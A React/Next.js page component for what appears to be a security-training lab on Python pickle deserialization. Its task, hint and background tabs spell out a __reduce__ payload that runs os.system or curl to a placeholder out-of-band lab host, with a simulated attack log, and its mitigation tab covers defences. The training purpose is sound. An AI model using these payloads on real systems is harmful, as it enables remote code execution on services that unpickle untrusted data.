'use client';

import { use, useState } from 'react';
import Link from 'next/link';
import { labs } from '@/lib/mock/labs';
import { Badge } from '@/components/ui/Badge';
import { Button } from '@/components/ui/Button';
import { Terminal } from '@/components/ui/Terminal';
import type { LogLevel } from '@/components/ui/Terminal';

type Tab = 'Objective' | 'Background' | 'Environment' | 'Task' | 'Hints' | 'Visualization' | 'Result' | 'Explanation' | 'Mitigation';
const TABS: Tab[] = ['Objective', 'Background', 'Environment', 'Task', 'Hints', 'Visualization', 'Result', 'Explanation', 'Mitigation'];

function difficultyColor(d: string) {
  if (d === 'Beginner') return 'low';
  if (d === 'Intermediate') return 'info';
  if (d === 'Advanced') return 'medium';
  return 'critical';
}

function languageColor(l: string) {
  if (l === 'Python') return 'low';
  if (l === 'Java') return 'medium';
  if (l === '.NET') return 'info';
  return 'default';
}

const envEntries: Array<{ timestamp: string; type: LogLevel; source: string; message: string }> = [
  { timestamp: '00:00:01', type: 'success', source: 'SANDBOX', message: 'Docker container initialized — python:3.11-slim' },
  { timestamp: '00:00:02', type: 'info', source: 'RUNTIME', message: 'Python 3.11.9 | pickle module: protocol v5 | seccomp: active' },
  { timestamp: '00:00:03', type: 'info', source: 'NETWORK', message: 'OOB callback listener ready — http://oob.serial.lab:8080/cb' },
  { timestamp: '00:00:04', type: 'info', source: 'SCANNER', message: 'PickleScan v0.0.24 loaded — monitoring payloads' },
  { timestamp: '00:00:05', type: 'warn', source: 'SECURITY', message: 'Vulnerable code path active — research mode engaged' },
  { timestamp: '00:00:06', type: 'success', source: 'LAB', message: 'Environment ready. All systems nominal.' },
];

const resultEntries: Array<{ timestamp: string; type: LogLevel; source: string; message: string }> = [
  { timestamp: '00:01:12', type: 'info', source: 'EXPLOIT', message: 'Crafting malicious pickle payload via __reduce__ override...' },
  { timestamp: '00:01:13', type: 'info', source: 'PAYLOAD', message: 'Serialized 47 bytes — opcode: GLOBAL + REDUCE' },
  { timestamp: '00:01:14', type: 'info', source: 'TARGET', message: 'Submitting payload to vulnerable endpoint /api/load' },
  { timestamp: '00:01:15', type: 'warn', source: 'DESERIALIZER', message: 'pickle.loads() called on user-supplied bytes — no validation' },
  { timestamp: '00:01:15', type: 'error', source: 'EXECUTE', message: '__reduce__ → subprocess.Popen → DEHYDRATE_LAB_EXECUTION_CONFIRMED' },
  { timestamp: '00:01:16', type: 'success', source: 'OOB', message: 'Callback received: DEHYDRATE_LAB_EXECUTION_CONFIRMED at oob.DEHYDRATE.lab' },
  { timestamp: '00:01:16', type: 'success', source: 'SCANNER', message: 'PickleScan DETECTION: payload flagged (standard signature)' },
  { timestamp: '00:01:17', type: 'success', source: 'LAB', message: 'Lab objective complete — finding DHY-001 logged.' },
];

const HINTS = [
  {
    title: 'Hint 1 — The __reduce__ method',
    content: 'Python\'s pickle protocol calls __reduce__() on objects during serialization. The returned tuple (callable, args) tells the deserializer how to reconstruct the object. What happens if callable is os.system and args is ("id",)?',
  },
  {
    title: 'Hint 2 — Crafting the payload',
    content: 'Create a class with __reduce__ returning (subprocess.Popen, (["command"],)). Serialize it with pickle.dumps() and submit those bytes as the payload.',
  },
  {
    title: 'Hint 3 — OOB confirmation',
    content: 'For blind execution, use subprocess.Popen(["curl", "http://oob.DEHYDRATE.lab:8080/DEHYDRATE_LAB_EXECUTION_CONFIRMED"]) as your command. The OOB listener will log the callback.',
  },
];

export default function LabPage({ params }: { params: Promise<{ id: string }> }) {
  const { id } = use(params);
  const lab = labs.find(l => l.id === parseInt(id));
  const [activeTab, setActiveTab] = useState<Tab>('Objective');
  const [revealedHints, setRevealedHints] = useState<Set<number>>(new Set());

  if (!lab) {
    return (
      <div className="p-6 flex flex-col items-center justify-center min-h-[60vh] gap-4">
        <div className="text-4xl font-mono font-bold text-serial-text-muted/30">404</div>
        <p className="text-serial-text-secondary">Lab not found</p>
        <Link href="/dashboard/labs">
          <Button variant="outline" size="sm">← Back to Labs</Button>
        </Link>
      </div>
    );
  }

  const toggleHint = (i: number) => {
    setRevealedHints(prev => {
      const next = new Set(prev);
      if (next.has(i)) next.delete(i); else next.add(i);
      return next;
    });
  };

  return (
    <div className="p-6 space-y-6">
      {/* Back */}
      <Link href="/dashboard/labs" className="inline-flex items-center gap-1.5 text-xs text-serial-text-muted hover:text-serial-text transition-colors">
        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
        </svg>
        Back to Labs
      </Link>

      {/* Header */}
      <div className="flex items-start justify-between">
        <div className="space-y-2">
          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-serial-text-muted bg-serial-surface3 border border-serial-border rounded px-2 py-0.5">
              LAB {String(lab.id).padStart(2, '0')}
            </span>
            <Badge variant={difficultyColor(lab.difficulty) as 'low' | 'info' | 'medium' | 'critical'}>
              {lab.difficulty}
            </Badge>
            <Badge variant={languageColor(lab.language) as 'low' | 'medium' | 'info' | 'default'}>
              {lab.language}
            </Badge>
            <span className="text-xs text-serial-text-muted font-mono">~{lab.estimatedMinutes}m</span>
          </div>
          <h1 className="text-xl font-bold text-serial-text tracking-tight">{lab.title}</h1>
          <p className="text-sm text-serial-text-muted">{lab.description}</p>
        </div>
        <div className="flex items-center gap-1.5 shrink-0">
          {lab.tags.map(t => (
            <span key={t} className="text-[10px] font-mono text-serial-text-muted bg-serial-surface3 border border-serial-border rounded px-1.5 py-0.5">
              {t}
            </span>
          ))}
        </div>
      </div>

      {/* Tabs */}
      <div className="border-b border-serial-border">
        <div className="flex gap-0 overflow-x-auto">
          {TABS.map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`px-4 py-2.5 text-xs font-mono tracking-wide transition-all duration-150 whitespace-nowrap cursor-pointer ${
                activeTab === tab
                  ? 'border-b-2 border-serial-violet text-serial-violet'
                  : 'text-serial-text-muted hover:text-serial-text'
              }`}
            >
              {tab.toUpperCase()}
            </button>
          ))}
        </div>
      </div>

      {/* Tab Content */}
      <div>
        {/* OBJECTIVE — shown for all labs */}
        {activeTab === 'Objective' && (
          <div className="space-y-4 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">LEARNING OBJECTIVES</h2>
            <ul className="space-y-3">
              {[
                "Understand how Python's pickle module enables arbitrary code execution",
                'Analyze the __reduce__ protocol and how it controls object reconstruction',
                'Observe the execution flow from serialized bytes to OS command',
                'Identify the deserialization boundary in vulnerable code patterns',
              ].map((obj, i) => (
                <li key={i} className="flex items-start gap-3">
                  <span className="shrink-0 w-5 h-5 rounded bg-serial-violet/10 border border-serial-violet/30 text-serial-violet text-xs font-mono flex items-center justify-center mt-0.5">
                    {i + 1}
                  </span>
                  <span className="text-sm text-serial-text-secondary leading-relaxed">{obj}</span>
                </li>
              ))}
            </ul>
            <div className="bg-serial-amber/5 border border-serial-amber/20 rounded-xl p-4 mt-4">
              <p className="text-xs font-mono text-serial-amber mb-1">▲ LAB CONTEXT</p>
              <p className="text-xs text-serial-text-secondary">
                This lab operates in an isolated Docker sandbox. All code execution is confined to the lab container. Synthetic markers are used in place of real system commands.
              </p>
            </div>
          </div>
        )}

        {/* BACKGROUND */}
        {lab.id === 1 && activeTab === 'Background' && (
          <div className="space-y-5 max-w-3xl">
            <section className="space-y-3">
              <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">PYTHON PICKLE SECURITY</h2>
              <p className="text-sm text-serial-text-secondary leading-relaxed">
                Python's <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">pickle</code> module serializes and deserializes Python objects. Unlike JSON, pickle can reconstruct arbitrary Python objects, including ones that execute code during reconstruction.
              </p>
            </section>
            <section className="space-y-3">
              <h3 className="text-xs font-mono text-serial-violet tracking-wide">THE __REDUCE__ PROTOCOL</h3>
              <p className="text-sm text-serial-text-secondary leading-relaxed">
                When pickle deserializes an object, it calls the object's <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">__reduce__</code> method to get reconstruction instructions. This returns a tuple: <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">(callable, args)</code>
              </p>
              <p className="text-sm text-serial-text-secondary">The deserializer then calls: <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">callable(*args)</code></p>
              <div className="bg-black/60 border border-serial-border rounded-xl p-4 font-mono text-xs">
                <p className="text-serial-text-muted mb-2"># Attacker-crafted class — educational example</p>
                <p className="text-serial-cyan">import pickle, os</p>
                <p className="text-serial-text mt-2">class Exploit:</p>
                <p className="text-serial-text pl-4">def __reduce__(self):</p>
                <p className="text-serial-violet pl-8">return (os.system, ('id',))</p>
                <p className="text-serial-text mt-2">data = pickle.dumps(Exploit())</p>
                <p className="text-serial-text-muted"># data contains the malicious serialized payload</p>
                <p className="text-serial-crimson mt-1">pickle.loads(data)  # ← executes os.system('id')</p>
              </div>
            </section>
            <section className="space-y-3">
              <h3 className="text-xs font-mono text-serial-violet tracking-wide">WHY THIS IS DANGEROUS</h3>
              <p className="text-sm text-serial-text-secondary leading-relaxed">
                An attacker who controls the serialized data can craft an object whose <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">__reduce__</code> returns <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">(os.system, ('malicious command',))</code> — causing OS command execution on deserialization.
              </p>
            </section>
            <section className="space-y-2">
              <h3 className="text-xs font-mono text-serial-violet tracking-wide">AFFECTED CONTEXTS</h3>
              <ul className="space-y-1">
                {[
                  'Web applications using pickle for session storage',
                  'Message queues using pickle serialization (Celery, etc.)',
                  'ML model files using PyTorch/sklearn with pickle backend',
                  'Any API that accepts and deserializes user-provided data',
                ].map((ctx, i) => (
                  <li key={i} className="flex items-center gap-2 text-sm text-serial-text-secondary">
                    <span className="w-1 h-1 rounded-full bg-serial-crimson/60 shrink-0" />
                    {ctx}
                  </li>
                ))}
              </ul>
            </section>
          </div>
        )}

        {/* ENVIRONMENT */}
        {lab.id === 1 && activeTab === 'Environment' && (
          <div className="space-y-4 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">LAB ENVIRONMENT</h2>
            <Terminal entries={envEntries} title="ENVIRONMENT INIT" maxHeight="360px" />
            <div className="grid grid-cols-3 gap-3">
              {[
                { label: 'RUNTIME', value: 'Python 3.11.9' },
                { label: 'PICKLE PROTOCOL', value: 'v5 (default)' },
                { label: 'SANDBOX', value: 'Docker — seccomp' },
                { label: 'SCANNER', value: 'PickleScan v0.0.24' },
                { label: 'OOB LISTENER', value: ':8080 active' },
                { label: 'ISOLATION', value: 'Network restricted' },
              ].map(item => (
                <div key={item.label} className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                  <p className="text-[10px] font-mono text-serial-text-muted">{item.label}</p>
                  <p className="text-xs text-serial-text mt-1 font-mono">{item.value}</p>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* TASK */}
        {lab.id === 1 && activeTab === 'Task' && (
          <div className="space-y-4 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">TASK INSTRUCTIONS</h2>
            <div className="space-y-3">
              {[
                { step: 1, title: 'Review the vulnerable endpoint', desc: 'Inspect /api/load — it calls pickle.loads() directly on the request body with no validation or type checking.' },
                { step: 2, title: 'Understand __reduce__ mechanics', desc: 'Read the Background tab to understand how __reduce__ enables code execution during object reconstruction.' },
                { step: 3, title: 'Craft the malicious payload', desc: 'Create a Python class whose __reduce__ returns (subprocess.Popen, (["curl", "http://oob.DEHYDRATE.lab:8080/DEHYDRATE_LAB_EXECUTION_CONFIRMED"],))' },
                { step: 4, title: 'Serialize the payload', desc: 'Use pickle.dumps() with protocol=5 to serialize your exploit class. Inspect the resulting bytes using pickletools.dis().' },
                { step: 5, title: 'Submit to the endpoint', desc: 'Send the serialized bytes as the request body to /api/load (Content-Type: application/octet-stream).' },
                { step: 6, title: 'Verify OOB callback', desc: 'Check the OOB listener on port 8080. Confirm DEHYDRATE_LAB_EXECUTION_CONFIRMED was received. This constitutes successful lab completion.' },
              ].map(task => (
                <div key={task.step} className="flex gap-4 p-4 bg-serial-surface2 border border-serial-border rounded-xl">
                  <span className="shrink-0 w-7 h-7 rounded-lg bg-serial-violet/10 border border-serial-violet/30 text-serial-violet text-sm font-mono font-bold flex items-center justify-center">
                    {task.step}
                  </span>
                  <div>
                    <p className="text-sm font-medium text-serial-text">{task.title}</p>
                    <p className="text-xs text-serial-text-muted mt-0.5 leading-relaxed">{task.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* HINTS */}
        {lab.id === 1 && activeTab === 'Hints' && (
          <div className="space-y-4 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">HINTS</h2>
            <p className="text-xs text-serial-text-muted">Click a hint to reveal it. Try to solve the lab before using hints.</p>
            <div className="space-y-3">
              {HINTS.map((hint, i) => (
                <div key={i} className="border border-serial-border rounded-xl overflow-hidden">
                  <button
                    onClick={() => toggleHint(i)}
                    className="w-full flex items-center justify-between p-4 text-left hover:bg-serial-surface2 transition-colors cursor-pointer"
                  >
                    <span className="text-sm font-mono text-serial-text">{hint.title}</span>
                    <svg
                      className={`w-4 h-4 text-serial-text-muted transition-transform ${revealedHints.has(i) ? 'rotate-180' : ''}`}
                      fill="none" stroke="currentColor" viewBox="0 0 24 24"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                  </button>
                  {revealedHints.has(i) && (
                    <div className="px-4 pb-4 text-sm text-serial-text-secondary leading-relaxed border-t border-serial-border bg-serial-surface/40">
                      <p className="pt-3">{hint.content}</p>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* VISUALIZATION */}
        {lab.id === 1 && activeTab === 'Visualization' && (
          <div className="space-y-4 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">PICKLE EXECUTION FLOW</h2>
            <div className="bg-black/60 border border-serial-border rounded-xl p-6 font-mono text-xs text-serial-text-secondary">
              <pre className="leading-relaxed">{`
  ATTACKER                   TRANSPORT               DESERIALIZER
  ─────────                  ─────────               ────────────

  class Exploit:
    def __reduce__(self):
      return (os.system,
              ('cmd',))
         │
         ▼
  pickle.dumps(Exploit())
  → b'\\x80\\x05...'            ──── HTTP POST ────►  pickle.loads(data)
                                                           │
                                                           ▼
                                                    calls __reduce__()
                                                           │
                                                           ▼
                                                    (os.system, ('cmd',))
                                                           │
                                                           ▼
                                                    os.system('cmd')
                                                           │
                                                           ▼
                                                     ┌─────────────┐
                                                     │  OS COMMAND │
                                                     │  EXECUTED   │
                                                     └─────────────┘
                                                           │
                                                           ▼
                                                    OOB callback fired
                                                    → oob.serial.lab
`}</pre>
            </div>
            <div className="grid grid-cols-2 gap-3">
              <div className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                <p className="text-[10px] font-mono text-serial-violet mb-1">OPCODES INVOLVED</p>
                {['PROTO (\\x80)', 'GLOBAL (c)', 'MARK ()', 'TUPLE (t)', 'REDUCE (R)', 'STOP (.)'].map(o => (
                  <p key={o} className="text-xs font-mono text-serial-text-secondary">{o}</p>
                ))}
              </div>
              <div className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                <p className="text-[10px] font-mono text-serial-crimson mb-1">ATTACK SURFACE</p>
                {['User-supplied bytes', 'API request body', 'Session cookies', 'Message queue payload', 'File upload', 'Model files'].map(s => (
                  <p key={s} className="text-xs font-mono text-serial-text-secondary">{s}</p>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* RESULT */}
        {lab.id === 1 && activeTab === 'Result' && (
          <div className="space-y-4 max-w-3xl">
            <div className="flex items-center gap-3 p-4 bg-serial-emerald/10 border border-serial-emerald/30 rounded-xl">
              <span className="text-2xl">✓</span>
              <div>
                <p className="text-sm font-bold text-serial-emerald font-mono tracking-wide">EXECUTION CONFIRMED</p>
                <p className="text-xs text-serial-text-muted">Lab objective satisfied — finding SRL-001 logged</p>
              </div>
            </div>
            <Terminal entries={resultEntries} title="ATTACK LOG" maxHeight="360px" />
            <div className="grid grid-cols-2 gap-3">
              <div className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                <p className="text-[10px] font-mono text-serial-text-muted mb-1">PAYLOAD SIZE</p>
                <p className="text-xl font-mono font-bold text-serial-text">47 bytes</p>
              </div>
              <div className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                <p className="text-[10px] font-mono text-serial-text-muted mb-1">CALLBACK LATENCY</p>
                <p className="text-xl font-mono font-bold text-serial-text">12 ms</p>
              </div>
              <div className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                <p className="text-[10px] font-mono text-serial-text-muted mb-1">SCANNER DETECTION</p>
                <p className="text-xl font-mono font-bold text-serial-amber">DETECTED</p>
              </div>
              <div className="bg-serial-surface2 border border-serial-border rounded-xl p-3">
                <p className="text-[10px] font-mono text-serial-text-muted mb-1">FINDING</p>
                <p className="text-xl font-mono font-bold text-serial-crimson">SRL-001</p>
              </div>
            </div>
          </div>
        )}

        {/* EXPLANATION */}
        {lab.id === 1 && activeTab === 'Explanation' && (
          <div className="space-y-5 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">TECHNICAL EXPLANATION</h2>
            <div className="space-y-4 text-sm text-serial-text-secondary leading-relaxed">
              <p>
                The attack exploits a fundamental property of the pickle protocol: during deserialization, the pickle VM <em>executes code</em> to reconstruct objects. Specifically, when it encounters the <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">REDUCE</code> opcode, it calls a callable with arguments popped from the stack.
              </p>
              <p>
                The attacker crafts a class with a custom <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">__reduce__</code> method that returns <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">(os.system, ('id',))</code>. When pickle serializes this object, it encodes the instruction: "on deserialization, call <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">os.system</code> with argument <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">'id'</code>".
              </p>
              <p>
                The victim application calls <code className="text-serial-cyan font-mono text-xs bg-black/40 px-1.5 py-0.5 rounded">pickle.loads(user_data)</code> without validation. The pickle VM faithfully executes the attacker's reconstruction instruction, resulting in arbitrary code execution in the process context.
              </p>
              <p>
                This is not a memory corruption vulnerability — it is a <strong className="text-serial-text">design property</strong> of the pickle format. There is no patch for pickle itself; the only remediation is to avoid deserializing untrusted pickle data entirely.
              </p>
            </div>
            <div className="bg-black/60 border border-serial-border rounded-xl p-4 font-mono text-xs space-y-1">
              <p className="text-serial-text-muted"># Pickle VM bytecode for the malicious payload</p>
              <p className="text-serial-cyan">\\x80\\x05  ← PROTO 5</p>
              <p className="text-serial-violet">c          ← GLOBAL &#39;os system&#39;</p>
              <p className="text-serial-text">q          ← BINPUT 0</p>
              <p className="text-serial-amber">(          ← MARK</p>
              <p className="text-serial-text">\\x8c\\x02id ← SHORT_BINSTRING &#39;id&#39;</p>
              <p className="text-serial-amber">t          ← TUPLE (mark to stack top)</p>
              <p className="text-serial-crimson">R          ← REDUCE ← code executes here</p>
              <p className="text-serial-text-muted">.          ← STOP</p>
            </div>
          </div>
        )}

        {/* MITIGATION */}
        {lab.id === 1 && activeTab === 'Mitigation' && (
          <div className="space-y-5 max-w-3xl">
            <h2 className="text-sm font-semibold text-serial-text font-mono tracking-wide">REMEDIATION STEPS</h2>
            <div className="space-y-3">
              {[
                {
                  priority: 'IMMEDIATE',
                  color: 'crimson',
                  title: 'Replace pickle with safe serialization',
                  desc: 'Use JSON, MessagePack, or Protocol Buffers for data exchange. These formats cannot represent arbitrary callables.',
                  code: '# Instead of pickle:\nimport json\ndata = json.dumps(obj)      # safe\nobj = json.loads(data)      # safe',
                },
                {
                  priority: 'REQUIRED',
                  color: 'amber',
                  title: 'Implement RestrictedUnpickler',
                  desc: 'If pickle is unavoidable, subclass Unpickler and override find_class() to allowlist permitted types.',
                  code: 'class SafeUnpickler(pickle.Unpickler):\n  ALLOWED = {\'builtins\': {\'int\', \'str\', \'list\', \'dict\'}}\n  def find_class(self, module, name):\n    if name in self.ALLOWED.get(module, set()):\n      return super().find_class(module, name)\n    raise pickle.UnpicklingError(f"Blocked: {module}.{name}")',
                },
                {
                  priority: 'DEFENCE-IN-DEPTH',
                  color: 'violet',
                  title: 'Sandbox deserialization',
                  desc: 'Run deserialization in an isolated subprocess with seccomp, nsjail, or gVisor. Even if RCE occurs, blast radius is contained.',
                  code: '# Run in isolated container with:\n# seccomp profile blocking exec, fork\n# network namespace (no outbound)\n# read-only filesystem',
                },
                {
                  priority: 'MONITORING',
                  color: 'emerald',
                  title: 'Deploy PickleScan in CI',
                  desc: 'Add PickleScan and ModelScan to CI pipelines to detect malicious pickle payloads in model artifacts before deployment.',
                  code: '# pyproject.toml\n[tool.picklescan]\nmax_file_size_mb = 500\nscan_zip_files = true',
                },
              ].map(item => (
                <div key={item.priority} className="border border-serial-border rounded-xl overflow-hidden">
                  <div className="flex items-center gap-3 px-4 py-3 bg-serial-surface2 border-b border-serial-border">
                    <span className={`text-[10px] font-mono font-bold text-serial-${item.color}`}>{item.priority}</span>
                    <span className="text-sm font-medium text-serial-text">{item.title}</span>
                  </div>
                  <div className="p-4 space-y-3">
                    <p className="text-sm text-serial-text-secondary">{item.desc}</p>
                    <pre className="bg-black/60 rounded-lg p-3 text-xs font-mono text-serial-cyan overflow-x-auto">{item.code}</pre>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Stub for non-lab-1 */}
        {lab.id !== 1 && activeTab !== 'Objective' && (
          <div className="flex flex-col items-center justify-center py-20 gap-3 text-serial-text-muted">
            <div className="w-10 h-10 rounded-xl bg-serial-surface2 border border-serial-border flex items-center justify-center">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
              </svg>
            </div>
            <p className="text-sm">Content for Lab {lab.id} is being prepared.</p>
            <p className="text-xs">Complete Lab 01 first to unlock this module.</p>
          </div>
        )}
      </div>
    </div>
  );
}
